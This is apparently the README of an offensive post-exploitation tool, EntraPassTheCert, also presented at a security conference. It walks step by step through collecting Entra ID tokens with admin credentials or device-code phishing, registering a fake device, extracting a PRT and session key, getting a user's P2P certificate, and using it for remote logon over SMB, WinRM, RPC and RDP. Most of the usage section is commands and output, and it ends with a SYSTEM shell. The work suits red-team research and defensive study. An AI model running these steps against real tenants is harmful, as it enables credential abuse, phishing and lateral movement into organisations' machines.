# EntraPassTheCert

EntraPassTheCert is a post-exploitation tool that allows attackers to request Entra ID's user P2P certificate and authenticate to a remote Entra joinned machine with it.

```
$ python3 entraptc.py -h

usage: entraptc.py [-h] [--debug] {request_p2pcert,smb,rdp,winrm,rpc} ...

post-exploitation tool for requesting p2p cert and authenticate with it

positional arguments:
  {request_p2pcert,smb,rdp,winrm,rpc}
                        Available commands
    request_p2pcert     request P2P cert with PRT and SessionKey
    smb                 SMB to Entra joinned machine with P2P cert
    rdp                 RDP to Entra joinned machine with P2P cert
    winrm               WinRM to Entra joinned machine with P2P cert
    rpc                 RPC to Entra joinned machine with P2P cert

options:
  -h, --help            show this help message and exit
  --debug               debug option
```

The code is built based on the existing great tools.

- [impacket](https://github.com/fortra/impacket)
- [ROADTools](https://github.com/dirkjanm/ROADtools)
- [AADInternals](https://github.com/Gerenios/AADInternals)
- [pywinrm](https://github.com/diyan/pywinrm)
- [aardwolf](https://github.com/skelsec/aardwolf)


This tool is presented at Troopers 2025:

[Hopping Accross Devices: Expanding Lateral Movement through Pass-the-Certificate Attack](https://troopers.de/troopers25/talks/afv8bw/)

## Usage

### Request P2P certificate 

First, acquire required Microsoft Entra tokens with the credentials of any account that has local administrator access to a target device.

```bash
$ roadtx gettokens -r devicereg -c 29d9ed98-a469-4536-ade2-f981bc1d605e -u globaladmin@***.onmicrosoft.com -p $PASSWORD
Requesting token for resource urn:ms-drs:enterpriseregistration.windows.net
Tokens were written to .roadtools_auth
```

If you don't have the credentials, you could also execute devie-code phishing to acquire the tokens.

```bash
$ roadtx gettokens --device-code -r devicereg -c 29d9ed98-a469-4536-ade2-f981bc1d605e
Requesting token for resource urn:ms-drs:enterpriseregistration.windows.net
To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code HGCUCJ6CS to authenticate.
Tokens were written to .roadtools_auth
```

Next, Register a fake device to Entra ID.

```bash
$ roadtx device -a join -n fake_device
Saving private key to fake_device.key
Registering device
Device ID: 0d9d2d66-7343-4bf2-a3dd-377c9e1e6244
Saved device certificate to fake_device.pem
```

Then, using the registed device, request PRT and session key.

```bash
$ REFRESHTOKEN=(`cat .roadtools_auth | jq -r .refreshToken`) 

$ roadtx prt -c fake_device.pem -k fake_device.key -r $REFRESHTOKEN
Obtained PRT: 1.AT0A7mRQZ....
Obtained session key: fabd04bf017c526fd...
Saved PRT to roadtx.prt
```

Once you receive PRT and session key, you can request user's P2P certificate.

```bash
$ PRT=(`cat roadtx.prt | jq -r .refresh_token`)

$ SESSIONKEY=(`cat roadtx.prt | jq -r .session_key`)

$ python3 entraptc.py request_p2pcert --prt $PRT --sessionkey $SESSIONKEY
[*] requesting P2P cert...
[+] successfully acquired P2P cert!
[*] here is your p2p cert pfx : p2pcert.pfx (pw: password)

```

### Pass the P2P certificate

You can authenticate to a Entra joinned machine using the P2P certificate as follows.

- SMB

```bash
$ python3 entraptc.py smb --target 192.168.153.133 --pfx p2pcert.pfx      
[*] connecting to 192.168.153.133 via SMB...
[+] sucessfully logged-on to the system!
Type help for list of commands
# shares
ADMIN$
C$
IPC$
# use C$
# ls
drw-rw-rw-          0  Fri May 30 15:52:50 2025 $Recycle.Bin
drw-rw-rw-          0  Sat Apr 19 01:54:46 2025 Documents and Settings
-rw-rw-rw-      12288  Sun Jun 15 10:45:59 2025 DumpStack.log.tmp
drw-rw-rw-          0  Fri May 30 09:06:09 2025 inetpub
-rw-rw-rw-  738197504  Sun Jun 15 10:45:58 2025 pagefile.sys
drw-rw-rw-          0  Sat Apr 19 02:49:28 2025 PerfLogs
drw-rw-rw-          0  Tue Jun 10 14:58:44 2025 Program Files
drw-rw-rw-          0  Tue May 27 15:59:56 2025 Program Files (x86)
drw-rw-rw-          0  Tue Jun 10 14:54:46 2025 ProgramData
drw-rw-rw-          0  Sat Apr 19 01:53:41 2025 Recovery
-rw-rw-rw-   16777216  Sun Jun 15 10:45:59 2025 swapfile.sys
drw-rw-rw-          0  Fri May 30 09:39:44 2025 System Volume Information
drw-rw-rw-          0  Fri May 30 15:52:23 2025 Users
drw-rw-rw-          0  Wed Jun 11 09:30:27 2025 Windows
```

- WinRM

```bash
$ python3 entraptc.py winrm --target 192.168.153.133 --pfx p2pcert.pfx
[*] connecting to 192.168.153.133 via WinRM...
[+] sucessfully logged-on to the system!

C:\Users\admin> whoami
azuread\admin
```

- RPC

```bash
$ python3 entraptc.py rpc --target 192.168.153.133 --pfx p2pcert.pfx                                                                   

[*] connecting to 192.168.153.133 via RPC...
[+] sucessfully logged-on to the system!

C:\Windows\System32>whoami
nt authority\system
```

- RDP
  - You need to specify the account's credentials

```bash
$ python3 entraptc.py rdp --username globaladmin@***.onmicrosoft.com --password $PASSWORD --target 192.168.153.133 --pfx p2pcert.pfx
```

## Notes

- The target machine should be Entra joinned machine, not Hybrid Entra joinned or Entra registered
- Tested Windows 11/10 machine but not Windows server

## Reference

https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597